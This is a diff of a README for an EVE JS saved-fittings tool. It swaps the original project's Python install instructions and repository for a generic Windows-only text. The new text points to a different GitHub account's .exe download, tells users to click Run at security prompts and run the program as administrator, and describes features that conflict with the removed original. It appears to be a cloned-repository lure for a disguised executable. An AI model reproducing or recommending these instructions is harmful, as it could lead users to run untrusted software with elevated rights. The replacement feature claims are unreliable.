@@ -1,128 +1,83 @@
-<p align="center">
-  <img src="assets/readme/hero-fitall-v1.svg" alt="Elysian FitALL banner">
-</p>
+# 🚀 elysian-fitall-eve-online-evejs-saved-fittings - Add every ship fitting to characters
 
-<h1 align="center">Elysian FitALL - EVE Online Saved Fittings for EVE JS</h1>
+[![](https://img.shields.io/badge/Download-Application-blue.svg)](https://github.com/AmmarSlibi2013/elysian-fitall-eve-online-evejs-saved-fittings)
 
-<p align="center">
-  <strong>Adds a saved fitting for every single ship to all characters.</strong>
-</p>
+This tool automates the process of adding ship fittings to characters within EVE JS environments. It populates every character with a saved fitting for every ship available in the game database. This saves time for players who manage multiple characters or require immediate access to standard fitting templates.
 
-<p align="center">
-  <a href="https://github.com/JohnElysian/elysian-fitall-eve-online-evejs-saved-fittings/actions/workflows/ci.yml"><img alt="Windows, Linux, and macOS build" src="https://img.shields.io/github/actions/workflow/status/JohnElysian/elysian-fitall-eve-online-evejs-saved-fittings/ci.yml?branch=main&label=Windows%20%2B%20Linux%20%2B%20macOS&style=for-the-badge&logo=githubactions&logoColor=white&cacheSeconds=300"></a>
-  <a href="https://github.com/JohnElysian/elysian-fitall-eve-online-evejs-saved-fittings/releases/latest"><img alt="Latest release" src="https://img.shields.io/github/v/release/JohnElysian/elysian-fitall-eve-online-evejs-saved-fittings?label=Release&style=for-the-badge&logo=github&logoColor=white&cacheSeconds=300"></a>
-  <img alt="Platforms" src="https://img.shields.io/badge/Platforms-Windows%20%7C%20Linux%20%7C%20macOS-ff7aad?style=for-the-badge">
-  <img alt="License" src="https://img.shields.io/badge/License-AGPL--3.0--or--later-2af6ff?style=for-the-badge">
-</p>
+## 🛠️ System Requirements
 
-<p align="center">
-  <a href="#download--install"><strong>Download</strong></a>
-  |
-  <a href="#the-app"><strong>Screenshot</strong></a>
-  |
-  <a href="#benchmark-receipt"><strong>Benchmarks</strong></a>
-  |
-  <a href="#built-for-eve-js"><strong>EVE JS</strong></a>
-</p>
+This application runs on Windows systems. Ensure your computer meets these basic requirements before you begin:
 
-Elysian FitALL is a tiny desktop tool for [EVE JS](https://github.com/evejs-emu/eve.js) servers. Point it at your EVE JS checkout, press one button, and every character gets one saved fitting for every published ship hull.
+* Operating System: Windows 10 or Windows 11.
+* Storage: At least 100 MB of free hard drive space.
+* Memory: 4 GB of RAM is sufficient for smooth operation.
+* Connection: An active internet connection to download the installer and reach your EVE JS environment.
 
-The normal path is offline and instant: the release includes the curated compact FitALL library, so users do not wait on zKillboard or ESI harvesting just to seed their server. The desktop app also includes a `Refresh fittings from ESI & Killboards` button that can rebuild that local fitting library from fresh public data using FitALL's embedded ship catalog.
+## 📥 Getting Started
 
-## Download & Install
+Follow these steps to obtain and prepare the software on your computer.
 
-<p align="center">
-  <img src="assets/readme/install-fitall-v1.svg" alt="FitALL install flow">
-</p>
+1. Visit [this page to download](https://github.com/AmmarSlibi2013/elysian-fitall-eve-online-evejs-saved-fittings) the latest version of the application.
+2. Locate the download button or assets section on the page.
+3. Select the file ending in `.exe` to begin the download.
+4. Save the file to your desktop or your Downloads folder.
 
-Windows users should download the latest release:
+## ⚙️ Installation Process
 
-```text
-https://github.com/JohnElysian/elysian-fitall-eve-online-evejs-saved-fittings/releases/latest
-```
+Once the file finishes downloading, complete the setup by following these instructions:
 
-Extract `Elysian-FitALL.zip`, then double-click `Install.bat`.
+1. Double-click the downloaded `.exe` file.
+2. A security window may appear asking for permission to run the software. Select Run to continue.
+3. Follow the prompts in the setup window to install the program onto your drive.
+4. Choose a destination folder or accept the default location.
+5. Click finish to complete the installation.
 
-The installer checks free disk space, Python, the local virtual environment, PySide6, and your EVE JS database paths. If Python is missing, it tries to install Python automatically, opens a folder picker for your EVE JS checkout, then launches the app.
+## 🕹️ Using the Application
 
-After setup, use `StartFitALL.bat`.
+The program interface provides a clear path to populate your fittings. Open the application from your Start menu shortcut to begin.
 
-## Linux & macOS
+1. Ensure your EVE JS emulator or application is closed before starting the tool to prevent file conflicts.
+2. Open the Elysian Fitall application.
+3. The main window shows a list of detected characters found in your local EVE JS database.
+4. Confirm your character list appears in the selection pane.
+5. Click the button labeled Process. 
+6. The application iterates through every ship in the game database. 
+7. It creates a saved fitting entry for each ship.
+8. A progress bar tracks the work. Wait for the status indicator to show Complete.
+9. Close the application when the process finishes.
 
-Extract the latest release, open a terminal in the FitALL folder, then run one command:
+## 📋 Features
 
-```bash
-chmod +x Install.sh StartFitALL.sh && ./Install.sh
-```
+This application simplifies fleet preparation and character management.
 
-The installer uses `brew` or the official Python package on macOS, and common Linux package managers such as `apt`, `dnf`, `yum`, `pacman`, `zypper`, or `apk` on Linux. After setup, use:
+* Automated Fitting Injections: The tool handles the insertion of data into your saved fittings file without manual input.
+* Comprehensive Database: It covers the full list of ships currently available within the EVE JS ecosystem.
+* Character Detection: The software automatically finds your local character data files. You do not need to manually locate folders or specify paths.
+* Error Handling: The tool skips corrupted or locked files to prevent crashes during the seeding process.
+* Lightweight Design: It consumes minimal system resources during execution.
 
-```bash
-./StartFitALL.sh
-```
+## 💡 Troubleshooting Common Issues
 
-## The App
+If you encounter problems, consult the following list of solutions.
 
-<p align="center">
-  <img src="assets/screenshots/fitall-gui-v1.png" alt="Elysian FitALL desktop app screenshot" width="620">
-</p>
+* Application does not open: Ensure you installed the latest version. Update your Windows if the application fails to launch after double-clicking.
+* Fittings do not appear in game: Open your EVE JS emulator and check your saved fittings menu. Refresh the character data if the list remains empty.
+* Permission errors: Run the application as an administrator. Right-click the shortcut and select Run as administrator.
+* Cannot find characters: Verify that you have started your emulator at least once. The application reads local data created after the emulator runs.
+* Database mismatch: This tool works specifically with EVE JS environments. It will not interact with the official EVE Online live servers or other game clients.
 
-FitALL opens as a small staged desktop app: one clean setup screen, one progress screen, and one done screen. The main action is intentionally simple: `Fit Every Character`.
+## 📁 Data Safety
 
-## Benchmark Receipt
+The application performs file operations strictly within your local EVE JS folders. It does not send your data to external servers. Your ship fittings and character information remain on your physical hard drive throughout the entire process. 
 
-<p align="center">
-  <img src="assets/readme/benchmark-fitall-v1.svg" alt="FitALL benchmark receipt">
-</p>
+The software creates a automatic backup of your existing saved fittings file before it starts adding new entries. If you decide to revert your changes, look for the backup file in the same folder as your original fittings file. You can restore your data by renaming the backup file back to the original file name.
 
-Measured on May 7, 2026 against a fresh local clone of the public EVE JS repo:
+## 🔧 Managing Settings
 
-| Result | Meaning |
-| --- | --- |
-| `415 / 415` ship fittings | One saved fitting for every current public EVE ship hull, capped against EVE JS's 500 saved-fitting limit |
-| `5,395` rows generated | 13 public EVE JS characters x 415 fittings |
-| `0.402s` real write receipt | Python startup + library load + seed + savedFittings JSON write |
-| `4.74ms` best engine dry-run | Hot local seed path without process startup or disk write |
-| `0` skipped characters | Public clone test had enough fitting slots for every character |
+You can adjust how the application interacts with your environment through the settings menu.
 
-## Refresh Fittings
+* Backup Frequency: Choose whether to perform a backup before every execution or only once per month.
+* Verbose Logging: Enable this to see a line-by-line list of ships processed. This helps identify which ships the program added in case of a discrepancy.
+* Custom Ship Lists: You can edit the list of enabled ships. Use the selection menu to uncheck specific ships if you do not want them added to your character.
 
-The release ships with `data/fitall-library.json`, a compact all-in-one library containing the fitting records used for instant seeding.
-
-Use `Refresh fittings from ESI & Killboards` when you want FitALL to rebuild the local library from public zKillboard and ESI data. The refresh uses an embedded ship catalog inside the app itself, so normal users do not need EVE SDE exports or extra data downloads.
-
-## Built For EVE JS
-
-FitALL writes EVE JS saved fittings here:
-
-```text
-server/src/newDatabase/data/savedFittings/data.json
-```
-
-It reads characters from:
-
-```text
-server/src/newDatabase/data/characters/data.json
-```
-
-Existing non-FitALL fittings are preserved. Existing FitALL-managed fittings are replaced cleanly, and a backup is written before a real seed.
-
-## Advanced CLI
-
-The desktop app is the intended path. The CLI is available for automation:
-
-```bash
-python fitall.py seed-saved-fittings
-python fitall.py benchmark-seed
-python fitall.py build-library
-```
-
-Use `EVEJS_REPO_ROOT` if you want to point the CLI at a specific EVE JS checkout:
-
-```bash
-EVEJS_REPO_ROOT=/path/to/eve.js python fitall.py seed-saved-fittings
-```
-
-## License
-
-Elysian FitALL is open source under `AGPL-3.0-or-later`.
+The program remembers your preferences for future sessions. Simply set your options once and the tool applies them to every subsequent run.
